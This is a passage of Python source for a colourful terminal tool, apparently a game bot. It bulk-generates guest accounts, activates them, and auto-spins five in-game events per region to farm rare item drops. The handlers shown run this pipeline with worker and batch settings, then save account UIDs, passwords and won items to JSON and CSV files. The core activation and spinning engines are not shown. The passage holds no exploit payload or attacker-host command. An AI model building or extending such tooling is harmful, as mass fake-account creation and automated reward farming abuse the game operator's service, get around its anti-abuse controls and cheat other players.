#  EVENTS SELECTION (SINGLE / ALL)
# ══════════════════════════════════════════════════════════════════════════

def select_events(region: str) -> list:
    """Show event selection menu — SINGLE or ALL"""
    available = get_available_events(region)

    if not available:
        log_err(f"No events available for {region}")
        return []

    print()
    print(f"  {NEXUS.BOLD}{gradient_text(f'🎯 SELECT EVENTS ({region})', NEXUS.ANGEL_FLOW, 0)}{NEXUS.RESET}")
    print()

    # Mode selection
    print(f"  {NEXUS.GOLD}╭{'─' * 60}╮{NEXUS.RESET}")
    print(f"  {NEXUS.GOLD}│{NEXUS.RESET}  {NEXUS.BOLD}{NEXUS.CORAL}[1]{NEXUS.RESET}  {NEXUS.BOLD}{NEXUS.YELLOW}SINGLE EVENT{NEXUS.RESET}   {NEXUS.STEEL}— pick ONE{NEXUS.RESET}")
    print(f"  {NEXUS.GOLD}│{NEXUS.RESET}  {NEXUS.BOLD}{NEXUS.CORAL}[2]{NEXUS.RESET}  {NEXUS.BOLD}{NEXUS.YELLOW}ALL {len(available)} EVENTS{NEXUS.RESET}    {NEXUS.STEEL}— full auto (recommended){NEXUS.RESET}")
    print(f"  {NEXUS.GOLD}╰{'─' * 60}╯{NEXUS.RESET}")
    print()

    mode = ask_input("Mode", "2", NEXUS.LIME).strip()
    print()

    if mode == "2":
        log_angel(f"Mode: ALL EVENTS ({len(available)})")
        return available

    # Single event list
    print(f"  {NEXUS.BOLD}{NEXUS.YELLOW}Available Events:{NEXUS.RESET}")
    print()

    print(f"  {NEXUS.GOLD}╭{'─' * 62}╮{NEXUS.RESET}")
    for i, event_key in enumerate(available, 1):
        display = EVENTS_DATA[event_key].get("display_name", event_key)
        payload = EVENTS_DATA[event_key]["payloads"].get(region.upper(), "")
        short_payload = payload[:12] + "..." if len(payload) > 12 else payload

        line = (
            f"  {NEXUS.GOLD}│{NEXUS.RESET} "
            f"{NEXUS.BOLD}{NEXUS.CORAL}[{i}]{NEXUS.RESET}  "
            f"{NEXUS.BOLD}{NEXUS.YELLOW}{display:<32}{NEXUS.RESET} "
            f"{NEXUS.STEEL}{short_payload}{NEXUS.RESET}"
        )
        vis = _vlen(line)
        pad = max(0, 64 - vis)
        print(line + " " * pad + f"{NEXUS.GOLD}│{NEXUS.RESET}")
    print(f"  {NEXUS.GOLD}╰{'─' * 62}╯{NEXUS.RESET}")
    print()

    while True:
        try:
            choice_str = ask_input(f"Event (1-{len(available)})", "1", NEXUS.YELLOW)
            choice = int(choice_str)
            if 1 <= choice <= len(available):
                selected = [available[choice - 1]]
                display = EVENTS_DATA[selected[0]].get("display_name", selected[0])
                log_angel(f"Event locked: {display}")
                return selected
        except (ValueError, IndexError):
            pass
        log_warn(f"Enter number 1-{len(available)}")


# ══════════════════════════════════════════════════════════════════════════
#  CHART BAR HELPER
# ══════════════════════════════════════════════════════════════════════════

def _chart_bar(label: str, value: int, total: int, width: int = 30, color: str = None) -> str:
    if color is None:
        color = NEXUS.LIME

    if total <= 0:
        ratio = 0.0
    else:
        ratio = value / total

    filled = int(width * ratio)
    empty = width - filled

    bar = f"{color}{'█' * filled}{NEXUS.STEEL}{'░' * empty}{NEXUS.RESET}"
    pct = f"{ratio * 100:5.1f}%"

    return (
        f"  {NEXUS.SILVER}{label:<14}{NEXUS.RESET} "
        f"{bar} {NEXUS.BOLD}{NEXUS.GOLD}{pct}{NEXUS.RESET}  "
        f"{NEXUS.ASH}({value}/{total}){NEXUS.RESET}"
    )


# ══════════════════════════════════════════════════════════════════════════
#  SUCCESS DASHBOARD
# ══════════════════════════════════════════════════════════════════════════

def show_success_dashboard(
    live_stats: "LiveStats" = None,
    generated: int = None,
    activated: int = None,
    elapsed: float = None,
):
    """
    Premium final dashboard:
    - Generator stats (accounts created)
    - Spinner stats (spins, rare, fails)
    - Success chart
    - Region breakdown
    - Event breakdown (सभी 5 events)
    - Rarity breakdown
    - Output files
    """
    # ── Build snapshot ──
    if live_stats is not None:
        snap = live_stats.snapshot()
        total = snap["spins_done"] + snap["spins_failed"]
        rate_pct = (snap["spins_done"] / max(1, total)) * 100
        if elapsed is None:
            elapsed = snap["elapsed"]
    else:
        snap = {
            "spins_done":    0,
            "spins_failed":  0,
            "specials":      0,
            "logins_ok":     0,
            "logins_fail":   0,
            "elapsed":       elapsed or 0,
            "rate":          0,
            "by_event":      {},
            "by_region":     {},
            "rare_found":    [],
        }
        total = 0
        rate_pct = 0.0

    if generated is None:
        generated = state.success_count
    if activated is None:
        activated = state.activated_count

    # ── Header ──
    print()
    print()
    header = "🎉 OPERATION COMPLETE"
    print(f"  {NEXUS.BOLD}{gradient_text(header, NEXUS.ANGEL_FLOW, 0)}{NEXUS.RESET}")
    print()

    inner_w = 62
    print(f"  {NEXUS.GOLD}╔{NEXUS.RESET}{angel_border(inner_w, '═')}{NEXUS.GOLD}╗{NEXUS.RESET}")

    def row(emoji, label, value, val_color):
        content = (
            f"  {NEXUS.STEEL}║{NEXUS.RESET} {emoji} "
            f"{NEXUS.SILVER}{label:<16}{NEXUS.RESET} "
            f"{NEXUS.STEEL}·{NEXUS.RESET} "
            f"{NEXUS.BOLD}{val_color}{value}{NEXUS.RESET}"
        )
        vis = _vlen(content)
        pad = max(0, inner_w - vis + 2)
        return content + " " * pad + f"  {NEXUS.GOLD}║{NEXUS.RESET}"

    # ── Generator section ──
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}  {NEXUS.BOLD}{NEXUS.YELLOW}🎮 GENERATOR{NEXUS.RESET}")
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}")
    print(row("📦", "Generated", f"{generated:,}", NEXUS.LIME))
    print(row("✅", "Activated", f"{activated:,}", NEXUS.CYAN))
    print(row("⏳", "Pending",   f"{generated - activated:,}", NEXUS.ORANGE))

    # ── Divider ──
    print(f"  {NEXUS.GOLD}╠{NEXUS.RESET}{angel_border(inner_w, '═')}{NEXUS.GOLD}╣{NEXUS.RESET}")

    # ── Spinner section ──
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}  {NEXUS.BOLD}{NEXUS.YELLOW}🎰 SPINNER{NEXUS.RESET}")
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}")
    print(row("📦", "Total Spins",   f"{total:,}", NEXUS.WHITE))
    print(row("✅", "Successful",    f"{snap['spins_done']:,}", NEXUS.LIME))
    print(row("❌", "Failed",        f"{snap['spins_failed']:,}",
              NEXUS.RED if snap['spins_failed'] > 0 else NEXUS.STEEL))
    print(row("💎", "Rare Drops",    f"{snap['specials']:,}", NEXUS.YELLOW))
    print(row("📊", "Success Rate",  f"{rate_pct:.1f}%", NEXUS.CYAN))

    # ── Divider ──
    print(f"  {NEXUS.GOLD}╠{NEXUS.RESET}{angel_border(inner_w, '═')}{NEXUS.GOLD}╣{NEXUS.RESET}")

    # ── Chart ──
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}  {NEXUS.BOLD}{NEXUS.YELLOW}📈 SUCCESS CHART{NEXUS.RESET}")
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}")

    chart_ok = _chart_bar("Successful", snap["spins_done"], max(1, total), 26, NEXUS.LIME)
    vis = _vlen(chart_ok)
    pad = max(0, inner_w - vis + 2)
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}{chart_ok}" + " " * pad + f"  {NEXUS.GOLD}║{NEXUS.RESET}")

    chart_fail = _chart_bar("Failed", snap["spins_failed"], max(1, total), 26, NEXUS.RED)
    vis = _vlen(chart_fail)
    pad = max(0, inner_w - vis + 2)
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}{chart_fail}" + " " * pad + f"  {NEXUS.GOLD}║{NEXUS.RESET}")

    # ── Divider ──
    print(f"  {NEXUS.GOLD}╠{NEXUS.RESET}{angel_border(inner_w, '═')}{NEXUS.GOLD}╣{NEXUS.RESET}")

    # ── Time ──
    print(row("⏱️", "Duration",  format_duration(elapsed), NEXUS.ICE))
    print(row("⚡", "Speed",     f"{total / max(1, elapsed):.2f}/s", NEXUS.GOLD))

    # ── Divider ──
    print(f"  {NEXUS.GOLD}╠{NEXUS.RESET}{angel_border(inner_w, '═')}{NEXUS.GOLD}╣{NEXUS.RESET}")

    # ── Region breakdown ──
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}  {NEXUS.BOLD}{NEXUS.YELLOW}🌍 REGION BREAKDOWN{NEXUS.RESET}")
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}")

    if snap["by_region"]:
        for region, rdata in snap["by_region"].items():
            line = (
                f"    {NEXUS.ORANGE}{region:<5}{NEXUS.RESET} "
                f"{NEXUS.LIME}✔{rdata['ok']:>4}{NEXUS.RESET}  "
                f"{NEXUS.RED}✖{rdata['fail']:>4}{NEXUS.RESET}  "
                f"{NEXUS.YELLOW}★{rdata['special']:>3}{NEXUS.RESET}"
            )
            vis = _vlen(line)
            pad = max(0, inner_w - vis + 2)
            print(f"  {NEXUS.STEEL}║{NEXUS.RESET}{line}" + " " * pad + f"  {NEXUS.GOLD}║{NEXUS.RESET}")
    else:
        empty = f"    {NEXUS.ASH}(no data){NEXUS.RESET}"
        vis = _vlen(empty)
        pad = max(0, inner_w - vis + 2)
        print(f"  {NEXUS.STEEL}║{NEXUS.RESET}{empty}" + " " * pad + f"  {NEXUS.GOLD}║{NEXUS.RESET}")

    # ── Divider ──
    print(f"  {NEXUS.GOLD}╠{NEXUS.RESET}{angel_border(inner_w, '═')}{NEXUS.GOLD}╣{NEXUS.RESET}")

    # ── Event breakdown — सभी 5 events force show ──
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}  {NEXUS.BOLD}{NEXUS.YELLOW}🎯 EVENT BREAKDOWN{NEXUS.RESET}")
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}")

    for event_key in EVENTS_DATA.keys():
        edata = snap["by_event"].get(event_key, {"ok": 0, "fail": 0, "special": 0})
        display = EVENTS_DATA[event_key].get("display_name", event_key)
        short = display[:18]

        line = (
            f"    {NEXUS.CYAN}{short:<20}{NEXUS.RESET} "
            f"{NEXUS.LIME}✔{edata['ok']:>4}{NEXUS.RESET}  "
            f"{NEXUS.RED}✖{edata['fail']:>4}{NEXUS.RESET}  "
            f"{NEXUS.YELLOW}★{edata['special']:>3}{NEXUS.RESET}"
        )
        vis = _vlen(line)
        pad = max(0, inner_w - vis + 2)
        print(f"  {NEXUS.STEEL}║{NEXUS.RESET}{line}" + " " * pad + f"  {NEXUS.GOLD}║{NEXUS.RESET}")

    # ── Divider ──
    print(f"  {NEXUS.GOLD}╠{NEXUS.RESET}{angel_border(inner_w, '═')}{NEXUS.GOLD}╣{NEXUS.RESET}")

    # ── Rare items found ──
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}  {NEXUS.BOLD}{NEXUS.YELLOW}💎 RARE DROPS FOUND{NEXUS.RESET}")
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}")

    rare_list = snap.get("rare_found", [])[:5]
    if rare_list:
        for r in rare_list:
            line = (
                f"    {NEXUS.YELLOW}★{NEXUS.RESET} "
                f"{NEXUS.CYAN}{str(r.get('uid', '?'))[:14]:<14}{NEXUS.RESET} "
                f"{NEXUS.STEEL}→{NEXUS.RESET} "
                f"{NEXUS.BOLD}{NEXUS.GOLD}{str(r.get('item', '?'))[:22]}{NEXUS.RESET}"
            )
            vis = _vlen(line)
            pad = max(0, inner_w - vis + 2)
            print(f"  {NEXUS.STEEL}║{NEXUS.RESET}{line}" + " " * pad + f"  {NEXUS.GOLD}║{NEXUS.RESET}")
    else:
        empty = f"    {NEXUS.ASH}(no rare drops yet){NEXUS.RESET}"
        vis = _vlen(empty)
        pad = max(0, inner_w - vis + 2)
        print(f"  {NEXUS.STEEL}║{NEXUS.RESET}{empty}" + " " * pad + f"  {NEXUS.GOLD}║{NEXUS.RESET}")

    # ── Divider ──
    print(f"  {NEXUS.GOLD}╠{NEXUS.RESET}{angel_border(inner_w, '═')}{NEXUS.GOLD}╣{NEXUS.RESET}")

    # ── Output files ──
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}  {NEXUS.BOLD}{NEXUS.YELLOW}📁 OUTPUT FILES{NEXUS.RESET}")
    print(f"  {NEXUS.STEEL}║{NEXUS.RESET}")

    files_list = [
        ("Accounts",  os.path.basename(Config.ACCOUNTS_FILE)),
        ("Activated", os.path.basename(Config.ACTIVATED_FILE)),
        ("Items",     os.path.basename(Config.ALL_ITEMS_FILE)),
        ("Events",    "events/*.json"),
        ("CSV",       os.path.basename(Config.ACTIVATION_RESULTS_FILE)),
    ]

    for label, fname in files_list:
        line = (
            f"    {NEXUS.LIME}{label:<10}{NEXUS.RESET} "
            f"{NEXUS.STEEL}→{NEXUS.RESET} "
            f"{NEXUS.GOLD}{fname[:40]}{NEXUS.RESET}"
        )
        vis = _vlen(line)
        pad = max(0, inner_w - vis + 2)
        print(f"  {NEXUS.STEEL}║{NEXUS.RESET}{line}" + " " * pad + f"  {NEXUS.GOLD}║{NEXUS.RESET}")

    # ── Bottom border ──
    print(f"  {NEXUS.GOLD}╚{NEXUS.RESET}{angel_border(inner_w, '═')}{NEXUS.GOLD}╝{NEXUS.RESET}")
    print()

    # ── Footer ──
    credit = f"👑 {_OWNER_NAME}  ★  {_OWNER_TAG}"
    print(f"  {NEXUS.BOLD}{gradient_text(credit, NEXUS.ANGEL_FLOW, 0)}{NEXUS.RESET}")
    print()
    print(f"  {NEXUS.LIME}✅ Done! Check {os.path.basename(RESULT_FOLDER)}/ for results.{NEXUS.RESET}")
    print()


# ══════════════════════════════════════════════════════════════════════════
#  STORAGE STATS
# ══════════════════════════════════════════════════════════════════════════

def count_files_in_dir(dir_path: str, ext: str = ".json") -> int:
    try:
        return len([f for f in os.listdir(dir_path) if f.endswith(ext)])
    except Exception:
        return 0


def get_dir_size_mb(dir_path: str) -> float:
    try:
        total = 0
        for dirpath, _, filenames in os.walk(dir_path):
            for fn in filenames:
                fp = os.path.join(dirpath, fn)
                try:
                    total += os.path.getsize(fp)
                except Exception:
                    pass
        return total / (1024 * 1024)
    except Exception:
        return 0.0


def print_storage_stats():
    total_files = count_files_in_dir(RESULT_FOLDER, ".json")
    total_size = get_dir_size_mb(RESULT_FOLDER)

    w = min(Term.width(), 96)
    rows = [
        Term.kv("Files",    f"{NEXUS.GOLD}{total_files}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Size",     f"{NEXUS.GOLD}{total_size:.2f} MB{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Location", f"{NEXUS.STEEL}{RESULT_FOLDER}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
    ]
    print()
    Term.box("💾 STORAGE STATS", rows, NEXUS.CYAN, w, NEXUS.GOLD)
    print()


# ══════════════════════════════════════════════════════════════════════════
#  FINALIZE
# ══════════════════════════════════════════════════════════════════════════

def finalize_session(live_stats=None, elapsed: float = None):
    """
    Finalize session:
    - Flush all saves
    - Save CSV
    - Print storage stats
    - Show dashboard
    """
    try:
        # Flush everything
        save_final_data()
        save_csv()

        # Storage
        print_storage_stats()

        # Dashboard
        show_success_dashboard(
            live_stats=live_stats,
            generated=state.success_count,
            activated=state.activated_count,
            elapsed=elapsed,
        )
    except Exception as e:
        log_error_to_file(str(e), "finalize_session")


# ══════════════════════════════════════════════════════════════════════════
#  END OF PART 7 of 9
# ══════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════
#  PART 8 — MAIN MENU, HANDLERS, MENU LOOP
# ══════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════
#  MAIN MENU
# ══════════════════════════════════════════════════════════════════════════
MAIN_MENU = {
    "1": {"label": "⚡ FULL AUTO",       "desc": "Generate + Activate + Spin 5 events"},
    "2": {"label": "🎮 GENERATE ONLY",  "desc": "Only create guest accounts"},
    "3": {"label": "🔓 ACTIVATE ONLY",  "desc": "Activate existing accounts"},
    "4": {"label": "🎰 SPIN ONLY",      "desc": "Spin 5 events on activated accounts"},
    "5": {"label": "📊 VIEW STATS",     "desc": "Previous session stats"},
    "6": {"label": "📁 VIEW FILES",     "desc": "Output files info"},
    "7": {"label": "📤 EXPORT CSV",     "desc": "Export results to CSV"},
    "0": {"label": "❌ EXIT",            "desc": "Close application"},
}


def show_main_menu():
    """Display main menu"""
    print()
    print(f"  {NEXUS.BOLD}{gradient_text('⚡ MAIN MENU', NEXUS.ANGEL_FLOW, 0)}{NEXUS.RESET}")
    print()

    print(f"  {NEXUS.GOLD}╭{'─' * 62}╮{NEXUS.RESET}")
    for key, item in MAIN_MENU.items():
        label_color = NEXUS.CORAL if key == "0" else NEXUS.YELLOW
        line = (
            f"  {NEXUS.GOLD}│{NEXUS.RESET} "
            f"{NEXUS.BOLD}{NEXUS.LIME}[{key}]{NEXUS.RESET}  "
            f"{NEXUS.BOLD}{label_color}{item['label']:<22}{NEXUS.RESET} "
            f"{NEXUS.STEEL}· {item['desc']}{NEXUS.RESET}"
        )
        vis = _vlen(line)
        pad = max(0, 64 - vis)
        print(line + " " * pad + f"{NEXUS.GOLD}│{NEXUS.RESET}")
    print(f"  {NEXUS.GOLD}╰{'─' * 62}╯{NEXUS.RESET}")
    print()

    credit = f"👑 {_OWNER_NAME}  ★  {_OWNER_VER}"
    print(f"  {NEXUS.BOLD}{gradient_text(credit, NEXUS.ANGEL_FLOW, 0)}{NEXUS.RESET}")
    print()


# ══════════════════════════════════════════════════════════════════════════
#  HANDLER — FULL AUTO (Gen → Act → Spin)
# ══════════════════════════════════════════════════════════════════════════

def handle_full_auto():
    """Option 1: Full pipeline"""
    print()
    print(f"  {NEXUS.BOLD}{gradient_text('⚡ FULL AUTO PIPELINE', NEXUS.FIRE_FLOW, 0)}{NEXUS.RESET}")
    print()

    # Step 1: Accounts
    total_accounts = select_account_count()

    # Step 2: Region
    region = select_region()

    # Step 3: Events
    events = select_events(region)
    if not events:
        log_err("No events selected")
        input(f"\n  {NEXUS.STEEL}Press Enter...{NEXUS.RESET}")
        return

    # Step 4: Workers
    workers = select_workers()

    # Step 5: Batch size
    batch_size = ask_int("Batch size (accounts per batch)", 10, 1, 200, NEXUS.CYAN)

    # Step 6: Prefix
    prefix = ask_input("Nickname prefix", Config.NICK_PREFIX, NEXUS.LIME).strip()
    if not prefix:
        prefix = Config.NICK_PREFIX

    # Step 7: Show summary
    show_config_summary(total_accounts, region, events, workers, batch_size, prefix)

    # Step 8: Confirm
    if not ask_yes_no("▶ Start FULL AUTO?", default=True):
        log_warn("Cancelled by user")
        return

    # Step 9: Reset state
    state.success_count = 0
    state.activated_count = 0
    state.activation_results.clear()
    clear_stop()

    # Step 10: Run
    print()
    log_angel("Launching FULL AUTO pipeline...")
    print()

    start = time.time()
    stats = run_full_pipeline_sync(
        total_accounts=total_accounts,
        region=region,
        events_to_run=events,
        workers=workers,
        batch_size=batch_size,
        prefix=prefix,
    )
    elapsed = time.time() - start

    # Step 11: Finalize
    finalize_session(live_stats=stats, elapsed=elapsed)

    input(f"\n  {NEXUS.STEEL}Press Enter to continue...{NEXUS.RESET}")


# ══════════════════════════════════════════════════════════════════════════
#  HANDLER — GENERATE ONLY
# ══════════════════════════════════════════════════════════════════════════

def handle_generate_only():
    """Option 2: Generate accounts only"""
    print()
    print(f"  {NEXUS.BOLD}{gradient_text('🎮 GENERATE ONLY', NEXUS.NEON_FLOW, 0)}{NEXUS.RESET}")
    print()

    total_accounts = select_account_count()
    region = select_region()
    workers = select_workers()
    batch_size = ask_int("Batch size", 10, 1, 200, NEXUS.CYAN)
    prefix = ask_input("Nickname prefix", Config.NICK_PREFIX, NEXUS.LIME).strip()
    if not prefix:
        prefix = Config.NICK_PREFIX

    # Empty events for gen only
    events = []

    show_config_summary(total_accounts, region, events, workers, batch_size, prefix)

    if not ask_yes_no("▶ Start GENERATE ONLY?", default=True):
        return

    # Reset
    state.success_count = 0
    state.activated_count = 0
    state.activation_results.clear()
    clear_stop()

    print()
    log_angel("Launching GENERATE ONLY...")
    print()

    start = time.time()
    stats = run_full_pipeline_sync(
        total_accounts=total_accounts,
        region=region,
        events_to_run=[],
        workers=workers,
        batch_size=batch_size,
        prefix=prefix,
        generate_only=True,
    )
    elapsed = time.time() - start

    finalize_session(live_stats=stats, elapsed=elapsed)

    input(f"\n  {NEXUS.STEEL}Press Enter...{NEXUS.RESET}")


# ══════════════════════════════════════════════════════════════════════════
#  HANDLER — ACTIVATE ONLY
# ══════════════════════════════════════════════════════════════════════════

def load_accounts_from_file(filepath: str) -> list:
    """Load accounts from JSON file"""
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, list):
            return []
        accounts = []
        for item in data:
            if not isinstance(item, dict):
                continue
            uid = item.get("uid")
            pwd = item.get("password")
            if uid and pwd:
                accounts.append({
                    "uid":      str(uid),
                    "password": str(pwd),
                    "jwt":      item.get("jwt", ""),
                    "open_id":  item.get("open_id", ""),
                    "region":   item.get("region", "IND"),
                })
        return accounts
    except Exception:
        return []


def handle_activate_only():
    """Option 3: Activate existing accounts"""
    print()
    print(f"  {NEXUS.BOLD}{gradient_text('🔓 ACTIVATE ONLY', NEXUS.ROYAL_FLOW, 0)}{NEXUS.RESET}")
    print()

    if not os.path.exists(Config.ACCOUNTS_FILE):
        log_err(f"No accounts file: {os.path.basename(Config.ACCOUNTS_FILE)}")
        log_info("Generate accounts first (Option 2)")
        input(f"\n  {NEXUS.STEEL}Press Enter...{NEXUS.RESET}")
        return

    accounts = load_accounts_from_file(Config.ACCOUNTS_FILE)
    if not accounts:
        log_err("No valid accounts found")
        input(f"\n  {NEXUS.STEEL}Press Enter...{NEXUS.RESET}")
        return

    log_ok(f"Loaded {len(accounts)} accounts")

    # Confirm
    if not ask_yes_no(f"▶ Activate {len(accounts)} accounts?", default=True):
        return

    state.activated_count = 0
    state.activation_results.clear()
    clear_stop()

    print()
    log_angel("Launching activation...")
    print()

    start = time.time()

    # Activate sequentially with small batches
    batch_size = 10
    for i in range(0, len(accounts), batch_size):
        if is_stopped():
            break
        batch = accounts[i:i + batch_size]

        for j, acc in enumerate(batch):
            slot = i + j + 1
            try:
                result = ActivationEngine.activate(
                    str(acc["uid"]),
                    str(acc["password"]),
                    acc=acc,
                )
                save_activation_result(str(acc["uid"]), result["status"], result["message"])

                if result["activated"]:
                    state.activated_count += 1
                    acc["activated"] = True
                    save_activated_record({
                        "uid":                acc["uid"],
                        "password":           acc["password"],
                        "account_id":         acc.get("account_id", "-"),
                        "name":               acc.get("name", "-"),
                        "region":             acc.get("region", "IND"),
                        "date_created":       now_str(),
                        "activation_status":  result["status"],
                        "activation_message": result["message"],
                    })
                    log_act(f"[{slot}/{len(accounts)}] ✅ {acc['uid']}")
                else:
                    log_err(f"[{slot}/{len(accounts)}] ✖ {acc['uid']} ({result['status']})")
            except Exception as e:
                log_error_to_file(str(e), "handle_activate_only")
                log_err(f"[{slot}/{len(accounts)}] Error: {e}")

            time.sleep(0.4)

    elapsed = time.time() - start
    save_csv()
    print_storage_stats()

    # Small summary
    w = min(Term.width(), 96)
    rows = [
        Term.kv("Total",     f"{NEXUS.GOLD}{len(accounts)}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Activated", f"{NEXUS.LIME}{state.activated_count}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Pending",   f"{NEXUS.ORANGE}{len(accounts) - state.activated_count}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Duration",  f"{NEXUS.ICE}{elapsed:.2f}s{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
    ]
    print()
    Term.box("ACTIVATION REPORT", rows, NEXUS.CYAN, w, NEXUS.GOLD)
    print()

    input(f"\n  {NEXUS.STEEL}Press Enter...{NEXUS.RESET}")


# ══════════════════════════════════════════════════════════════════════════
#  HANDLER — SPIN ONLY
# ══════════════════════════════════════════════════════════════════════════

def handle_spin_only():
    """Option 4: Spin only"""
    print()
    print(f"  {NEXUS.BOLD}{gradient_text('🎰 SPIN ONLY (5 EVENTS)', NEXUS.ICE_FLOW, 0)}{NEXUS.RESET}")
    print()

    # Prefer activated accounts
    source_file = Config.ACTIVATED_FILE if os.path.exists(Config.ACTIVATED_FILE) else Config.ACCOUNTS_FILE

    if not os.path.exists(source_file):
        log_err("No accounts file found")
        log_info("Generate accounts first (Option 2)")
        input(f"\n  {NEXUS.STEEL}Press Enter...{NEXUS.RESET}")
        return

    accounts = load_accounts_from_file(source_file)
    if not accounts:
        log_err("No valid accounts")
        input(f"\n  {NEXUS.STEEL}Press Enter...{NEXUS.RESET}")
        return

    log_ok(f"Loaded {len(accounts)} accounts from {os.path.basename(source_file)}")

    region = select_region()
    events = select_events(region)
    if not events:
        return

    workers = select_workers()
    batch_size = ask_int("Batch size", 10, 1, 200, NEXUS.CYAN)

    show_config_summary(len(accounts), region, events, workers, batch_size, "N/A")

    if not ask_yes_no("▶ Start SPIN?", default=True):
        return

    clear_stop()

    print()
    log_angel("Launching SPIN ONLY...")
    print()

    start = time.time()
    stats = run_async_spinner(
        accounts=accounts,
        region=region,
        events_to_run=events,
        workers=workers,
        batch_size=batch_size,
    )
    elapsed = time.time() - start

    finalize_session(live_stats=stats, elapsed=elapsed)

    input(f"\n  {NEXUS.STEEL}Press Enter...{NEXUS.RESET}")


# ══════════════════════════════════════════════════════════════════════════
#  HANDLER — VIEW STATS
# ══════════════════════════════════════════════════════════════════════════

def handle_view_stats():
    """Option 5: View previous session stats"""
    print()
    log_info("Checking previous session...")

    if not os.path.exists(Config.STATS_FILE):
        log_warn("No previous session stats found")
        input(f"\n  {NEXUS.STEEL}Press Enter...{NEXUS.RESET}")
        return

    try:
        with open(Config.STATS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
    except Exception:
        log_warn("Could not read stats file")
        input(f"\n  {NEXUS.STEEL}Press Enter...{NEXUS.RESET}")
        return

    w = min(Term.width(), 96)
    rows = [
        Term.kv("Saved At",     f"{NEXUS.STEEL}{data.get('saved_at', 'N/A')}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Total Spins",  f"{NEXUS.CYAN}{data.get('total_spins', 0)}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Rare Drops",   f"{NEXUS.YELLOW}{data.get('total_special', 0)}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Errors",       f"{NEXUS.RED}{data.get('total_errors', 0)}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Duration",     f"{NEXUS.ICE}{format_duration(data.get('duration', 0))}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
    ]
    print()
    Term.box("📊 LAST SESSION STATS", rows, NEXUS.PURPLE, w, NEXUS.GOLD)
    print()

    input(f"\n  {NEXUS.STEEL}Press Enter...{NEXUS.RESET}")


# ══════════════════════════════════════════════════════════════════════════
#  HANDLER — VIEW FILES
# ══════════════════════════════════════════════════════════════════════════

def handle_view_files():
    """Option 6: View output files"""
    print()
    w = min(Term.width(), 96)
    rows = [
        Term.kv("Accounts",   f"{NEXUS.STEEL}{Config.ACCOUNTS_FILE}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Activated",  f"{NEXUS.STEEL}{Config.ACTIVATED_FILE}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("All Items",  f"{NEXUS.STEEL}{Config.ALL_ITEMS_FILE}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Events Dir", f"{NEXUS.STEEL}{EVENTS_FOLDER}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Logs Dir",   f"{NEXUS.STEEL}{LOGS_FOLDER}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("CSV Log",    f"{NEXUS.STEEL}{Config.ACTIVATION_RESULTS_FILE}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
    ]
    print()
    Term.box("📁 OUTPUT FILES", rows, NEXUS.CYAN, w, NEXUS.GOLD)
    print()

    print_storage_stats()
    input(f"\n  {NEXUS.STEEL}Press Enter...{NEXUS.RESET}")


# ══════════════════════════════════════════════════════════════════════════
#  HANDLER — EXPORT CSV
# ══════════════════════════════════════════════════════════════════════════

def export_items_to_csv() -> bool:
    """Export all_items.json to CSV"""
    try:
        import csv as _csv

        source = Config.ALL_ITEMS_FILE
        output = os.path.join(RESULT_FOLDER, "all_items.csv")

        if not os.path.exists(source):
            log_warn("No items data to export")
            return False

        with open(source, "r", encoding="utf-8") as f:
            data = json.load(f)

        if not isinstance(data, list) or not data:
            log_warn("Empty items data")
            return False

        fieldnames = [
            "timestamp", "guestUid", "guestPass",
            "region", "event", "item_id", "item_name", "method"
        ]

        with open(output, "w", encoding="utf-8", newline="") as f:
            writer = _csv.DictWriter(f, fieldnames=fieldnames, extrasaction='ignore')
            writer.writeheader()
            for row in data:
                if isinstance(row, dict):
                    writer.writerow(row)

        log_ok(f"Exported → {os.path.basename(output)}")
        return True
    except Exception as e:
        log_err(f"CSV export failed: {e}")
        return False


def handle_export_csv():
    """Option 7: Export all_items to CSV"""
    print()
    log_angel("Exporting to CSV...")

    # 1. Export items
    export_items_to_csv()

    # 2. Export activation results (already in CSV form)
    try:
        save_csv()
        log_ok(f"Activation CSV → {os.path.basename(Config.ACTIVATION_RESULTS_FILE)}")
    except Exception as e:
        log_warn(f"Activation CSV failed: {e}")

    input(f"\n  {NEXUS.STEEL}Press Enter...{NEXUS.RESET}")


